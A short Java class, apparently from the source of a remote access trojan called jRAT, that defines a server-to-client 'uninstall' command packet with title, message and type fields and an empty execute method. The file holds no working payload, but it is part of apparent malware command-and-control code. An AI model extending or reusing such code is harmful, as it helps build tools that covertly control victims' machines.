package net.jrat.core.packet.server;

import net.jrat.core.packet.IPacket;

@SuppressWarnings("unused")
public class S2PacketUninstall implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String title;
	private String message;
	private int type;
	
	public S2PacketUninstall(String title, String message, int type)
	{
		this.title = title;
		this.message = message;
		this.type = type;
	}
	
	public S2PacketUninstall()
	{
		this(null, null, -1);
	}
	
	@Override
	public void execute(Object object) throws Exception {}
}